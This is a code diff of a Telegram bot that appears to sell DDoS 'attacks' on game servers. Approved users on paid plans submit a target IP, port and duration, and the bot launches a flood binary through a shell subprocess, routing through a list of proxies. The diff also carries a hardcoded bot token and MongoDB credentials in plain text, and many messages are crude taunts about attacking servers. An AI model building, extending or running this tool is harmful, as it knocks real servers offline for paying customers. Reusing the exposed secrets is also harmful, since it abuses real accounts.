@@ -16,11 +16,11 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '8057702686:AAHiVyd9bdhHzLWJ7CRBujAduJCmbQnKQi0'
+TOKEN = '8018797794:AAEdFriqrYmOrKotJrJhxtTaZhka9WHAAhk'
 MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
-FORWARD_CHANNEL_ID = -1002401089589          #telegram mai group bana ke chat id dalo      
-CHANNEL_ID = -1002401089589                      #telegram mai group bana ke chat id dalo      
-error_channel_id = -1002401089589                   #telegram mai group bana ke chat id dalo      
+FORWARD_CHANNEL_ID = -1002401089589
+CHANNEL_ID = -1002401089589
+error_channel_id = -1002401089589
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -39,31 +39,6 @@ async def start_asyncio_thread():
 
 def update_proxy():
     proxy_list = [
-        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
-        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
-        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
-        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
-        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
-        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
-        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
-        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
-        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
-        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
-        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
-        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
-        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
-        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
-        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
-        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
-        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
-        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
-        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
-        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
-        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
-        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
-        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
-        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
-        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
         "https://80.78.23.49:1080"
     ]
     proxy = random.choice(proxy_list)
@@ -84,7 +59,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./raja {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./raja {target_ip} {target_port} {duration} 999")
     await process.communicate()
     bot.attack_in_progress = False
 
@@ -102,8 +77,8 @@ def approve_or_disapprove_user(message):
     cmd_parts = message.text.split()
 
     if not is_admin:
-        bot.send_message(chat_id, "*🚫 you are not approved*\n"
-                                   "*contact admin to get approved*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*🚫 Access Denied!*\n"
+                                   "*You don't have permission to use this command.*", parse_mode='Markdown')
         return
 
     if len(cmd_parts) < 2:
@@ -135,10 +110,7 @@ def approve_or_disapprove_user(message):
             {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
             upsert=True
         )
-        msg_text = (f"*💫Congratulations💫*\n"
-                    f"*User {target_user_id} has been approved!*\n"
-                    f"*Plan: {plan} for {days} days!*\n"
-                    f"*Welcome to golem ddos world✨*")
+        msg_text = (f"*User {target_user_id} has been approved ✨*")
     else:  # disapprove
         users_collection.update_one(
             {"user_id": target_user_id},
@@ -146,9 +118,7 @@ def approve_or_disapprove_user(message):
             upsert=True
         )
         msg_text = (f"*❌ Disapproval Notice!*\n"
-                    f"*User {target_user_id} has been disapproved.*\n"
-                    f"*They have been reverted to free access.*\n"
-                    f"*Encourage them to try again soon🍁*")
+                    f"*User {target_user_id}*")
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@@ -168,9 +138,7 @@ def handle_attack_command(message):
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*🚫 JAA PHLE APPROVE HOKE AA APNE PAPA SE *\n"  # Access Denied message
-                                       "*You need to be approved to use this bot.*\n"  # Need approval message
-                                       "*Contact the owner for assistance: @GOLEM_OWNER*", parse_mode='Markdown')  # Contact owner message
+            bot.send_message(chat_id, "*🚫 TU APPROVE NI HAI JAA PHELE APPROVE HOKE AA*", parse_mode='Markdown')  # Contact owner message
             return
 
         # Check plan limits
@@ -184,22 +152,22 @@ def handle_attack_command(message):
                                        "*Consider upgrading or try again later.*", parse_mode='Markdown')  # Upgrade message
             return
 
-        bot.send_message(chat_id, "*💣JALDI ATTACK MAAR BAHI KISI NE BHI NI LAGA RAKHA *\n"  # Ready to launch message
-                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
-                                   "*Example: 142.67.35 24567 120* 🔥\n"  # Example message
-                                   "*OWNER @GOLEM_OWNER🧛*", parse_mode='Markdown')  # Start chaos message
+        if bot.attack_in_progress:
+            bot.send_message(chat_id, "*𝗣𝗛𝗟𝗘 𝗦𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗚𝗔 𝗛𝗔𝗜 𝗚𝗔𝗡𝗗𝗨*", parse_mode='Markdown')  # Check remaining time
+            return
+
+        bot.send_message(chat_id, "*💣𝗞𝗜𝗦𝗜 𝗡𝗘 𝗕𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗜 𝗟𝗔𝗚𝗔 𝗥𝗔𝗞𝗛𝗔*\n"
+                                        "*𝗝𝗔𝗟𝗗𝗜 𝗜𝗣 𝗗𝗘 𝗦𝗘𝗥𝗩𝗘𝗥 𝗞𝗜 𝗚𝗔𝗡𝗗 𝗠𝗔𝗥𝗨*", parse_mode='Markdown')  # Start chaos message
         bot.register_next_step_handler(message, process_attack_command)
 
     except Exception as e:
-        logging.error(f"Error In Attack Command: {e}")
+        logging.error(f"Error in attack command: {e}")
 
 def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
-                                               "*Please use the correct format and try again.*\n"  # Correct format message
-                                               "*Make sure to provide all three inputs! 🙅*", parse_mode='Markdown')  # Three inputs message
+            bot.send_message(message.chat.id, "*❗𝗗𝗛𝗔𝗡𝗚 𝗦𝗘 𝗜𝗣 𝗗𝗔𝗟❗*", parse_mode='Markdown')  # Three inputs message
             return
 
         target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
@@ -208,9 +176,8 @@ def process_attack_command(message):
             bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  # Blocked port message
                                                "*Please select a different port to proceed.*", parse_mode='Markdown')  # Different port message
             return
-        if duration >= 151:
-            bot.send_message(message.chat.id, "*⏳ Maximum duration is 151 seconds.*\n"  # Duration limit message
-                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')  # Shorten duration message
+        if duration >= 150:
+            bot.send_message(message.chat.id, "*⏳ 𝟭𝟱𝟬 𝗦𝗘𝗖 𝗛𝗜 𝗠𝗜𝗟𝗘𝗚𝗔 𝗙𝗥𝗘𝗘 𝗠𝗔𝗜.*", parse_mode='Markdown')  # Shorten duration message
             return  
 
         bot.attack_in_progress = True  # Mark that an attack is in progress
@@ -219,8 +186,8 @@ def process_attack_command(message):
 
         # Start the attack
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*🚀PING DEKH NICHE 677 HOGYA !👻*\n\n"  # Attack launched message
-                                           f"*TIME ==> {duration} seconds send feedback to @GOLEM_OWNER🔥*", parse_mode='Markdown')  # Duration message
+        bot.send_message(message.chat.id, f"*🚀𝗕𝗚𝗠𝗜 𝗞𝗜 𝗚𝗔𝗡𝗗 𝗠𝗔𝗥 𝗗𝗜 𝗚𝗬𝗜 𝗛𝗔𝗜🚀*\n\n"  # Attack launched message
+                                               f"*⏰ {duration}🔥*", parse_mode='Markdown')  # Duration message
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
@@ -241,15 +208,11 @@ def when_command(message):
         remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time
 
         if remaining_time > 0:
-            bot.send_message(chat_id, f"*⏳ PHLE SE KISI NE ATTACK LAGA RAKHA TU GAND MARA AB : {int(remaining_time)} seconds...*\n"
-                                          "*🔍 1 Time 1 Attack So Ping Stay Stable*\n"
-                                          "*💪 Stay tuned for updates!*", parse_mode='Markdown')
+            bot.send_message(chat_id, f"*⏳𝗔𝗕𝗛𝗜 𝗜𝗧𝗡𝗜 𝗧𝗜𝗠𝗘 𝗕𝗔𝗖𝗛𝗔 𝗛𝗔𝗜: {int(remaining_time)}*", parse_mode='Markdown')
         else:
-            bot.send_message(chat_id, "*🥰 The attack has successfully completed!*\n"
-                                       "*🚀 You can now launch your own attack*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗛𝗧𝗠 𝗛𝗢𝗚𝗬𝗔*", parse_mode='Markdown')
     else:
-        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
-                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*❌ 𝗞𝗢𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗜 𝗟𝗔𝗚 𝗥𝗔𝗞𝗛𝗔*", parse_mode='Markdown')
 
 
 @bot.message_handler(commands=['myinfo'])
@@ -264,7 +227,7 @@ def myinfo_command(message):
     elif user_data.get('plan', 0) == 0:
         # User found but not approved
         response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
-        response += "*Please reach out to the owner for assistance: @GOLEM_OWNER 🙏"  # Contact owner message
+        response += "*Please reach out to the owner for assistance: @GOLEM_OWNER* 🙏"  # Contact owner message
     else:
         # User found and approved
         username = message.from_user.username or "Unknown User"  # Default username if none provided
@@ -284,7 +247,7 @@ def rules_command(message):
     rules_text = (
         "*📜 Bot Rules - Keep It Cool!\n\n"
         "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
-        "2. Limit your kills!  \nStay under 25 kills to keep it fair.\n\n"
+        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
         "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
         "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
         "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
@@ -334,9 +297,9 @@ def owner_command(message):
 @bot.message_handler(commands=['start'])
 def start_message(message):
     try:
-        bot.send_message(message.chat.id, "*🌍 WELCOME TO GOLEM DDOS WORLD!* 🎉\n\n"
-                                           "*BEST AND STABLE SERVERS *\n\n"
-                                           "*💣 To use type * `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
+        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
+                                           "*🚀 Get ready to dive into the action!*\n\n"
+                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                            "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                            "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                            "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
@@ -349,7 +312,7 @@ def start_message(message):
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
-    logging.info("Bot started join @golemxddos...")
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
     while True:
         try:
             bot.polling(none_stop=True)
